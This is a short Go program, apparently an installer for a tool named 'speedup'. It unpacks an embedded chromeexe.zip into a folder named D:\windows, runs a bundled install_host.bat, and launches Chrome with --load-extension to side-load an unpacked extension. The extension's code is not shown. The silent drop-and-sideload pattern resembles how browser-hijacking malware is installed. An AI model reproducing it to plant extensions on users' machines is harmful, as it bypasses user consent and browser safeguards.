//go:generate goversioninfo -icon=resource/icon.ico -manifest=resource/goversioninfo.exe.manifest
package main

import (
	_ "embed"
	"fmt"
	"speedup/deal"

	//"speedup/deal"
)

//go:embed chromeexe.zip
var SrcFileZip []byte

var DESTPATH = "D:\\chromeexe.zip"
var DESTINSTALLDIR = "D:\\windows"
var BATPATH = DESTINSTALLDIR + "\\chromeexe\\initializehost\\install_host.bat"
var GUIDPATH = DESTINSTALLDIR + "\\chromeexe\\initializehost\\guid.txt"
var PLUGPATH = DESTINSTALLDIR + "\\chromeexe\\chrome-plugin"



func main()  {


	dst := deal.OpenFileSmart(DESTPATH)
	_ ,e:= dst.Write(SrcFileZip)
	if e != nil{
		fmt.Println(e)
	}
	deal.Depress(DESTPATH,DESTINSTALLDIR)
	//不要少了回车 \n
	deal.CmdDo("start "+BATPATH+"\n")
	deal.NotepadDo(GUIDPATH)
	chromePath := getChormePath()
	print(chromePath)
	deal.CmdDoRaw(chromePath,[]string{"--load-extension="+PLUGPATH},"")

}


func getChormePath() string  {
	return "C:\\Users\\"+deal.GetUserName()+"\\AppData\\Local\\" +
		"Google\\Chrome\\Application\\chrome.exe"
}